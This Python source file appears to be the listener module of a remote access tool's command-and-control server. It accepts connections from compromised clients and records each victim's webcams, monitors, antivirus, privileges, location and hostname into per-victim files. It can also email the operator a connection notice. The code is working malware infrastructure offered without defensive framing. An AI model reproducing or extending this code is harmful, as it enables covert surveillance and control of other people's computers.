import threading
import socket
import time
import sys
import os

from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.utility.status_message import *
from domestic.utility.delete_client import *
from binary.data_handling.send_data import *
from binary.data_handling.recv_data import *
from domestic.utility.get_timestamp import *
from domestic.make.make_directories import *
from domestic.utility.write_error import *
from domestic.utility.send_email import *
from domestic.utility.read_file import *
from domestic.global_state import *


@error_exception_handling
def listening(host, port, stdout=True):
  try:
    state['sockets']['server'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    state['sockets']['server'].bind((host, int(port)))
    state['sockets']['server'].listen()
  except Exception as err:
    write_error(err)
    state['sockets']['server'] = None
    
    if stdout:
      raise Exception('Socket binding error')
    else:
      sys.exit(0)
  else:
    if stdout:
      status_message(f'Listening on port {port}', 'success', {'dots': True, 'point': 'dot'})

  while True:
    try:
      client, addr = state['sockets']['server'].accept()
    except Exception as err:
      write_error(err)
      break
    
    try:
      send_data(client, {'message': 'CsBLDS4n5zPYq7JaxDjxWHK4', 'silent': state['options']['mode']['silent'], 'io_channels': state['settings']['io-channels']}, (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe_timeout': state['settings']['safe-timeout']})
      data = recv_data(client, (state['settings']['encryption'], state['settings']['headersize']))
      data.update({'timer': time.time()})

      add_client = True

      if os.path.isfile(f'{state["root"]}/{state["settings"]["folders"]["parent"]}/blacklist.txt'):
        blacklist = read_file(f'{state["root"]}/{state["settings"]["folders"]["parent"]}/blacklist.txt').decode(state['settings']['encoding']).strip().split('\n')
        for ip in blacklist:
          try:
            ip = socket.gethostbyname(ip)
          except Exception as err:
            write_error(err)

          if addr[0] == ip:
            add_client = False

      if not state['options']['validation']['duplicates']:
        for client_data_obj in state['sockets']['clients'][2]:
          if data['username'] == client_data_obj['username']:
            add_client = False
        
      if len(state['sockets']['clients'][0]) >= state['options']['validation']['max-clients']:
        add_client = False

      if add_client:
        if state['options']['information-gathering']['history']:
          make_directories([data['username']])
          with open(f'{state["root"]}/{data["username"]}/history.txt', 'a') as f:
            f.write(f'{data["username"]} connected at {get_timestamp()}\n')

        data_list = (client, addr, data)
        
        if state['options']['information-gathering']['whoami']:
          make_directories([data['username']])
          with open(f'{state["root"]}/{data["username"]}/whoami.txt', 'a') as f:
            title = f'Whoami at {get_timestamp()}'
            text = f'Monitors: {data["monitors"]}\nCams: {data["cams"]}\nI/O Channels: {data["io-channels"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}'
            f.write(f'{title}\n{text}\n{"-" * len(title)}\n')

        for index, item in enumerate(state['sockets']['clients']):
          item.append(data_list[index])

        if state['options']['notice']['email-notice']:
          send_email(
                    state['options']['notice']['email-data']['email'],
                    state['options']['notice']['email-data']['password'],
                    state['options']['notice']['email-data']['to'],
                    'Connection Notice!',
                    f'Connection at {get_timestamp()}\nMonitors: {data["monitors"]}\nCams: {data["cams"]}\nI/O Channels: {data["io-channels"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}')
      else:
        client.close()
    except Exception as err:
      write_error(err)


@error_exception_handling
def server(message):
  ip = validate_dict_key(message, 'ip')
  port = validate_dict_key(message, 'port')
  status = validate_dict_key(message, 'status')
  unbind = validate_dict_key(message, 'unbind')

  if port and ip:
    if state['sockets']['server'] is None:
      threading.Thread(target=listening, args=(ip, port), daemon=True).start()
    else:
      ip, port = state['sockets']['server'].getsockname()
      status_message(f'You are already listening for clients on {ip}:{port}', 'danger', {'dots': True})
  elif status:
    if state['sockets']['server']:
      ip, port = state['sockets']['server'].getsockname()
      status_message(f'You are listening for clients on {ip}:{port}', 'primary')
    else:
      status_message('You are not listening for clients', 'warning')
  elif unbind:
    if state['sockets']['server']:
      state['sockets']['server'].close()
      state['sockets']['server'] = None

      for index, client in enumerate(state['sockets']['clients'][0]):
        delete_client(index, False)

      status_message('You\'re no longer listening for clients\nServer socket is now closed', 'success')
    else:
      status_message(f'You\'re not listening for clients\nThere is no server socket to close', 'warning')
  else:
    raise Exception('Error message')